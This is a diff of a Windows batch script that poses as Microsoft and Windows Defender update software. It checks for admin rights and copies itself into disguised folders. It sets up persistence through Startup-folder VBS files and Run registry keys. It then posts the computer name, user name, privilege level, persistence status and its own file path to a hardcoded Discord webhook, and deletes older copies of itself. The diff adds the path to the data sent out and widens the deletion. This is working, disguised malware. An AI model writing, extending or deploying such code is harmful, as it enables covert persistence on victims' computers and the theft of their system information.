@@ -2,10 +2,11 @@
 setlocal
 cls
 
-set "version=2.1"
+set "version=2.2"
 
 
 :: check for admin rights
+set "AdminRights=false"
 net session >nul 2>&1
 if %errorlevel% == 0 (
     set "AdminRights=true"
@@ -15,7 +16,7 @@ if %errorlevel% == 0 (
 
 
 :: USER bat file
-
+set "userfile=NON"
 if exist "%APPDATA%/MicrosoftUpdate/%~n0%~x0" (
     set "userfile=YES"
 )
@@ -27,7 +28,7 @@ if not exist "%APPDATA%/MicrosoftUpdate/%~n0%~x0" (
 
 
 :: PC bat file
-
+set "pcfile=NON"
 if exist "%PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0" (
     set "pcfile=YES"
 )
@@ -39,7 +40,7 @@ if not exist "%PROGRAMDATA%/MicrosoftUpdate/%~n0%~x0" (
 
 
 :: USER Autostart
-
+set "userauto=NON"
 if exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
     set "userauto=YES"
 )
@@ -51,7 +52,7 @@ if not exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftU
 
 
 :: PC Autostart
-
+set "pcauto=NON"
 if exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/MicrosoftUpdate.vbs" (
     set "pcauto=YES"
 )
@@ -72,7 +73,7 @@ if not exist "%PROGRAMDATA%/Microsoft/Windows/Start Menu/Programs/Startup/Micros
 
 
 :: USER registry bat file
-
+set "userregistryfile=NON"
 if exist "%APPDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
     set "userregistryfile=YES"
 )
@@ -84,7 +85,7 @@ if not exist "%APPDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
 
 
 :: PC registry bat file
-
+set "pcregistryfile=NON"
 if exist "%PROGRAMDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
     set "pcregistryfile=YES"
 )
@@ -96,7 +97,7 @@ if not exist "%PROGRAMDATA%/MicrosoftDefenderUpdate/%~n0%~x0" (
 
 
 :: USER registry
-
+set "userregistryauto=NON"
 if exist "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
     powershell -Command "New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"
     set "userregistryauto=YES"
@@ -111,7 +112,7 @@ if not exist "%APPDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
 
 
 :: PC registry
-
+set "pcregistryauto=NON"
 if exist "%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs" (
     if "%AdminRights%"=="true" (
         powershell -Command "New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsDefenderSecurity' -Value '%PROGRAMDATA%\WindowsDefenderSecurity\WindowsDefenderSecurity.vbs -silent' -PropertyType String -Force"       
@@ -145,7 +146,9 @@ set "url1=https://discord.com/api/webhooks/"
 set "url2=1158045149935440032/nfB686WoABy0Ns6wTIT_z4zkm34DhKgWHIO8zMgP-4FWy21hahTaLPKz8v0gGYYkiQnk"
 set "url=%url1%%url2%"
 
-set "content=_setup_%ComputerName%;%USERNAME%;%time%;%version%;%AdminRights%;%userfile%;%pcfile%;%userauto%;%pcauto%;%userregistryfile%;%pcregistryfile%;%userregistryauto%;%pcregistryauto%"
+set "path=%~f0"
+
+set "content=_setup_%ComputerName%;%USERNAME%;%time%;%version%;%AdminRights%;%userfile%;%pcfile%;%userauto%;%pcauto%;%userregistryfile%;%pcregistryfile%;%userregistryauto%;%pcregistryauto%;%path%"
 
 powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $body = @{content='%content%'} | ConvertTo-Json; Invoke-RestMethod -Uri '%url%' -Method POST -ContentType 'application/json' -Body $body"
 
@@ -158,11 +161,13 @@ powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebR
 
 
 :: delete old files
-if exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftUpdate.bat" (
-    ::del /f /s /q "%PROGRAMDATA%\MicrosoftDefenderSecurity" (NO PERMISSION)
-)
 if exist "%APPDATA%/MicrosoftDefenderSecurity/MicrosoftUpdate.bat" (
-    del /f /q "%APPDATA%\MicrosoftDefenderSecurity"
+    del /f /s /q "%APPDATA%\MicrosoftDefenderSecurity"
+)
+if exist "%PROGRAMDATA%/MicrosoftDefenderSecurity/MicrosoftUpdate.bat" (
+    if "%AdminRights%"=="true" (
+        del /f /s /q "%PROGRAMDATA%\MicrosoftDefenderSecurity"
+    )
 )
 
 endlocal
